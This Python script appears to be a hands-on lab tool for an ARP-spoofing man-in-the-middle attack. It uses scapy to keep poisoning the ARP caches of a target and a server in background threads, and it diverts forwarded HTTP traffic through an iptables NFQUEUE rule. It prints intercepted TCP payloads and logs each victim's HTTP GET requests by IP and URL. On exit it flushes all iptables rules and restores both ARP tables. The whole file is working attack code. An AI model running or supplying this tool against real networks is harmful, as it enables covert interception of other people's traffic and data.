import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse
import threading
import netifaces
import time

# interface = netifaces.interfaces()[0] # Get interface
interface = "eth0"

finished = False

load_layer("http")

target_MAC, server_MAC = None, None

def ARP_loop(tar, ser):
    while not finished:
        send(ARP(op=2, pdst=ser, psrc=tar), iface=interface, verbose=False)
        time.sleep(3)

def sniff_sniff():
    # Sniff for HTTP requests
    load_layer("http")
    print(f"\nSniffing Http requests")
    sniff(lfilter=filter_get_requests, prn=HTTP_callback, store=1)
    

# Get MAC address for IP
def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    ans, unans = srp(arp_request, iface=interface, timeout=2, verbose=False)

    print(f"\nsent request for ip: {ip}")   
    for sent, received in ans:
        return received.hwsrc

    return None

# Custom filter for HTTP
def filter_get_requests(pkt):
    return pkt.haslayer(HTTPRequest) and pkt[HTTPRequest].Method==b'GET'

# Callback for when receiving a HTTP packet
def HTTP_callback(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n[+] {ip} Requested {url} with {method}")

# Queue callback
def q_callback(packet):
    print("packet received")

    raw_pkt = packet.get_payload()
    pkt = IP(raw_pkt)

    if TCP in pkt:
        tcp_pkt = pkt[TCP] 
        print(f"TCP Packet: {tcp_pkt.sport} -> {tcp_pkt.dport}")
        
        if pkt.dport == 80 or pkt.sport == 80: 
            print("HTTP data:", str(tcp_pkt.payload))

    packet.accept()                       

try:

    # Add NFQueue to forwarding rules
    os.system('iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1')
    print("\nAdded Forward rule")

    # Parse the server and target IP arguments
    parser = argparse.ArgumentParser(description='Get Target and Server') 
    parser.add_argument('target_ip', type=str, help='Target IP')
    parser.add_argument('server_ip', type=str, help='Server IP')
    args = parser.parse_args() 

    # Get the MAC of target and server to fix their ARP tables later
    target_MAC = get_mac(args.target_ip)
    print(f"\ntarget MAC: {target_MAC}")
    server_MAC = get_mac(args.server_ip)
    print(f"\nserver_MAC: {server_MAC}")

    # ARP Spoof in a loop
    thread1 = threading.Thread(target=ARP_loop, args=(args.server_ip, args.target_ip))
    thread1.daemon = True
    thread1.start()
    thread2 = threading.Thread(target=ARP_loop, args=(args.target_ip, args.server_ip))
    thread2.daemon = True
    thread2.start()
    print(f"\nSent ARPs")
    thread3 = threading.Thread(target=sniff_sniff)
    thread3.daemon = True
    thread3.start()

    nfqueue = NetfilterQueue()                       
    nfqueue.bind(1, q_callback)    
    #Running filter queue                    
    nfqueue.run()                                      
except KeyboardInterrupt:
    os.system('iptables -F')                     # flush all iptables rule
    finished = True  # Signal the thread to stop
    packet = ARP(op=2, pdst=args.server_ip, psrc=args.target_ip, hwsrc=target_MAC,hwdst=server_MAC)
    send(packet, iface=interface, count = 5)
    print(f"\nFixed server ARP table")
    packet = ARP(op=2, pdst=args.target_ip, psrc=args.server_ip, hwsrc=server_MAC, hwdst=target_MAC)
    send(packet, iface=interface, count = 5)
    print(f"\nFixed Client ARP table")
except Exception as e:
    print(e)